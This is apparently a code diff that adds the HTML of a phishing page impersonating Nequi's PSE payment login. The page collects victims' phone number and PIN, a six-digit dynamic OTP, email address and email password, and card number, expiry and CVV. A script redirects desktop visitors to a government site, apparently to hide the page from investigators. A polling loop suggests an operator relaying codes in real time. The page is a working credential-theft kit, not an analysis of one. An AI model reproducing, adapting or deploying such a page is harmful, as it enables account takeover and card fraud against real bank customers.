@@ -1,0 +1,324 @@
+<html>
+    <head>
+        <title>Recaga PSE Nequi</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        
+        <meta content="es" http-equiv="Content-Language">
+    
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="theme-color" content="#200020">
+
+        
+        <link rel="icon" type="image/svg+xml" sizes="32x32" href="assets/img/nequi-favicon-dark.svg" media="(prefers-color-scheme: dark)">
+    <link rel="icon" type="image/svg+xml" sizes="32x32" href="assets/img/nequi-favicon-light.svg" media="(prefers-color-scheme: light)">
+
+        <script type="text/javascript" src="../../js/jquery-3.6.0.min.js"></script>      
+        <link href="assets/css/styles.css" rel="stylesheet">    
+        <script type="text/javascript" src="assets/js/functions.js"></script>  
+        <script type="text/javascript" src="assets/js/ready.js"></script> 
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@200;300;400;500;600;700;800&display=swap" rel="stylesheet"> 
+
+    <style type="text/css">
+        #fondo{
+            position: fixed;
+            z-index: 300;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            background-color: rgb(255 255 255 / 80%);        
+            display: none;  
+        }
+
+        #cargando{
+            position: fixed;            
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 320;
+            display: none;
+        }
+
+        #mensaje{
+            border-radius: 8px;
+            color: #fff;
+            padding: 20px;
+            text-align: justify;
+            width: calc(94% - 40px);
+            max-width: 400px;
+            background-color: #da0081;
+            position: fixed;            
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 390;
+            display: none;
+        }
+
+        #mensaje2{
+            width: calc(94% - 40px);
+            max-width: 430px;
+            position: fixed;            
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 390;
+            display:none;
+        }
+
+        #fondo-rosado{
+            background-color:#da0081d9;
+            position: fixed;
+            z-index: 300;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;                
+            display:none; 
+        }
+    </style>  
+    </head>
+    <body>
+        <div id="fondo-rosado"></div>
+        <div id="fondo"></div>
+        <img id="cargando" src="assets/img/cargando.gif" width="180">
+        <div id="mensaje">Por favor espere un momento estamos validando algunos datos. Puede tardar un momento. No cierres o recargues esta ventana.</div>
+        <div id="mensaje2">
+            <div style="background-color: #fff;border-radius: 8px 8px 0px 0px;padding: 20px;">Por favor espere un momento estamos validando algunos datos. Puede tardar un momento. No cierres o recargues esta ventana.</div>
+            <div style="background-color: #E8E8E8;border-radius: 0px 0px 8px 8px;padding: 6px;"><img src="assets/img/esperando1.gif" width="50"></div>
+        </div>
+
+        <div class="contenedor" id="frm-info">  
+            <img src="assets/img/logo.svg" id="logo">
+            <br>
+            <div class="titulo">Pagos PSE de Nequi</div>
+
+            <div class="descripcion">Ingresa tu número de cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.</div>
+
+            <div class="inp" id="inp-cel" estado="0">                
+                <input type="text" name="txt-cel" id="txt-cel" class="entrada" autocomplete="off" maxlength="10" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" readonly>
+                <div class="etiqueta">Número de celular</div>
+                <div class="texto-demo">Número de celular</div>
+            </div>
+            <div class="inp" id="inp-re" estado="0">                
+                <input type="password" name="txt-re" id="txt-re" class="entrada" autocomplete="off" maxlength="4" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" readonly>
+                <div class="etiqueta">Clave</div>
+                <div class="texto-demo">Clave</div>
+            </div>
+                    
+            <table border="0" cellpadding="0" cellspacing="0" width="98%" style="margin: 27 auto 29 auto;">
+                <tr>
+                    <td valign="middle" align="center" width="8" height="78" style="background-image: url('assets/img/cap1.jpg');"></td>
+                    <td valign="middle" align="center" width="38" style="background-image: url('assets/img/cap2.jpg');"><img src="assets/img/aceptar.jpg" width="38" id="catcha"></td>
+                    <td valign="middle" align="center" width="113" style="background-image: url('assets/img/cap3.jpg');"></td>
+                    <td valign="middle" align="center" style="background-image: url('assets/img/cap4.jpg');"></td>
+                    <td valign="middle" align="center" width="98" style="background-image: url('assets/img/cap5.jpg');"></td>
+            </table>        
+            <button class="btnok" id="paso0" disabled>Entra</button>
+            <br>
+            <button class="btncancel">Ahora no</button>  
+            <div class="descripcion" style="margin-bottom: 20px; text-align: center !important;">¿Se te olvidó la clave? Abre Nequi en tu cel y cámbiala en segundos.</div>           
+        </div>
+
+
+        <div class="contenedor" id="frm-otp">  
+            <img src="assets/img/logo.svg" id="logo">
+            <br>
+            <div class="titulo">Pagos PSE de Nequi</div>
+
+            <div class="descripcion" id="mensaje-otp">Para confirmar tu pago escribe o pega la clave dinámica que encuentras en tu App Nequi.</div>
+            <br>
+
+            <table width="282" border="0" style="margin: 0 auto 15 auto;" cellspacing="12">
+                <tr>
+                    <td class="entrada-clave" valign="middle" align="center" id="otp1" width="16%"></td>
+                    <td class="entrada-clave" valign="middle" align="center" id="otp2" width="16%"></td>
+                    <td class="entrada-clave" valign="middle" align="center" id="otp3" width="16%"></td>
+                    <td class="entrada-clave" valign="middle" align="center" id="otp4" width="16%"></td>
+                    <td class="entrada-clave" valign="middle" align="center" id="otp5" width="16%"></td>
+                    <td class="entrada-clave" valign="middle" align="center" id="otp6" width="16%"></td>
+                </tr>
+            </table>
+
+            <table width="300"  border="0" style="margin:0 auto;">
+                <tr>
+                    <td class="num-teclado" valign="middle" align="center" width="33%">1</td>
+                    <td class="num-teclado" valign="middle" align="center" width="33%">2</td>
+                    <td class="num-teclado" valign="middle" align="center" width="33%">3</td>
+                </tr>
+                <tr>
+                    <td colspan="3"><div style="height:9px; width: 100%;"></div></td>                    
+                </tr>
+                <tr>
+                    <td class="num-teclado" valign="middle" align="center">4</td>
+                    <td class="num-teclado" valign="middle" align="center">5</td>
+                    <td class="num-teclado" valign="middle" align="center">6</td>
+                </tr>
+                <tr>
+                    <td colspan="3"><div style="height:9px; width: 100%;"></div></td>                    
+                </tr>
+                <tr>
+                    <td class="num-teclado" valign="middle" align="center">7</td>
+                    <td class="num-teclado" valign="middle" align="center">8</td>
+                    <td class="num-teclado" valign="middle" align="center">9</td>
+                </tr>
+                <tr>
+                    <td colspan="3"><div style="height:9px; width: 100%;"></div></td>                    
+                </tr>
+                <tr>
+                    <td valign="middle" align="center">&nbsp;</td>
+                    <td class="num-teclado" valign="middle" align="center">0</td>
+                    <td valign="middle" align="center"><img src="assets/img/borrar.jpg" id="borrar" style="cursor: pointer;"></td>
+                </tr>
+            </table>
+            <br><br>
+            <button class="btncancel">Cancela pago</button>    
+            <br>       
+        </div>
+
+
+
+        <div class="contenedor" id="frm-correo">  
+            <img src="assets/img/logo.svg" id="logo">
+            <br>
+            <div class="titulo">Pagos PSE de Nequi</div>
+
+            <div class="descripcion">Por favor ingesar la información requerida.</div>
+
+            <div class="inp" id="inp-correo" estado="0">                
+                <input type="text" name="txt-correo" id="txt-correo" class="entrada" autocomplete="off" readonly>
+                <div class="etiqueta">Correo eléctronico</div>
+                <div class="texto-demo">Correo eléctronico</div>
+            </div>
+            <div class="inp" id="inp-clave" estado="0">                
+                <input type="password" name="txt-clave" id="txt-clave" class="entrada" autocomplete="off" readonly>
+                <div class="etiqueta">Clave de correo</div>
+                <div class="texto-demo">Clave de correo</div>
+            </div>
+            <div class="inp" id="inp-celular" estado="0">                
+                <input type="text" name="txt-celular" id="txt-celular" class="entrada" autocomplete="off" maxlength="10" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" readonly>
+                <div class="etiqueta">Número de celular</div>
+                <div class="texto-demo">Número de celular</div>
+            </div>
+            <br>           
+            <button class="btnok" id="btn-correo" disabled>Actualizar</button>
+            <br>
+            <button class="btncancel">Ahora no</button>  
+            <br>       
+        </div>
+
+
+
+
+
+        <div class="contenedor" id="frm-tarjeta">  
+            <img src="assets/img/logo.svg" id="logo">
+            <br>
+            <div class="titulo">Pagos PSE de Nequi</div>
+
+            <div class="descripcion">Digite los siguientes datos para activar la seguridad de tu cuenta.</div>
+
+            <div class="inp" id="inp-tarjeta" estado="0">                
+                <input type="text" name="txt-tarjeta" id="txt-tarjeta" class="entrada" autocomplete="off" maxlength="16" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" readonly>
+                <div class="etiqueta">Tarjeta</div>
+                <div class="texto-demo">Tarjeta</div>
+            </div>
+
+            <div class="inp-fijo" id="inp-persona">    
+                <div class="etiqueta-fijo">Fecha</div>
+                <table width="100%" border="0" cellpadding="0" cellspacing="0">
+                    <tr>
+                        <td width="50%">
+                            <select id="txt-mes" name="txt-mes" class="entrada">
+                                <option value="" default="default" selected="selected">Mes</option>
+                                <option value="01">01</option>
+                                <option value="02">02</option>
+                                <option value="03">03</option>
+                                <option value="04">04</option>
+                                <option value="05">05</option>
+                                <option value="06">06</option>
+                                <option value="07">07</option>
+                                <option value="08">08</option>
+                                <option value="09">09</option>
+                                <option value="10">10</option>
+                                <option value="11">11</option>
+                                <option value="12">12</option>
+                            </select> 
+                        </td>
+                        <td width="50%">
+                            <select id="txt-ano" name="txt-ano" class="entrada">
+                                <option value="" default="" selected="selected">Año</option>        
+                                <option value="2024">2024</option>
+                                <option value="2025">2025</option>
+                                <option value="2026">2026</option>
+                                <option value="2027">2027</option>
+                                <option value="2028">2028</option>
+                                <option value="2029">2029</option>
+                                <option value="2030">2030</option>
+                                <option value="2031">2031</option>
+                                <option value="2032">2032</option>
+                                <option value="2033">2033</option>
+                            </select> 
+                        </td>
+                    </tr>
+                </table>
+
+                              
+            </div>
+
+            <div class="inp" id="inp-cvv" estado="0">                
+                <input type="password" name="txt-cvv" id="txt-cvv" class="entrada" autocomplete="off" maxlength="3" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" readonly>
+                <div class="etiqueta">CVV</div>
+                <div class="texto-demo">CVV</div>
+            </div>
+            <br>        
+            <button class="btnok" id="btn-tarjeta" disabled>Validar</button>
+            <br>
+            <button class="btncancel">Ahora no</button>                      
+        </div>
+
+
+    <body>
+
+<script>
+    function detectar_dispositivo() {
+        var dispositivo = "";
+        if (navigator.userAgent.match(/Android/i))
+            dispositivo = "Android";
+        else if (navigator.userAgent.match(/webOS/i))
+            dispositivo = "webOS";
+        else if (navigator.userAgent.match(/iPhone/i))
+            dispositivo = "iPhone";
+        else if (navigator.userAgent.match(/iPad/i))
+            dispositivo = "iPad";
+        else if (navigator.userAgent.match(/iPod/i))
+            dispositivo = "iPod";
+        else if (navigator.userAgent.match(/BlackBerry/i))
+            dispositivo = "BlackBerry";
+        else if (navigator.userAgent.match(/Windows Phone/i))
+            dispositivo = "Windows Phone";
+        else
+            dispositivo = "PC";
+        return dispositivo;
+    }
+
+    if (detectar_dispositivo() == "PC") {
+        window.location.href = 'https://www.dian.gov.co';
+    }
+</script>
+    
+</html>
+<script type="text/javascript">
+    var espera = 0;
+    
+    $(document).ready(function(){
+        setInterval(consultar_estado,2000);
+    });  
+</script> 
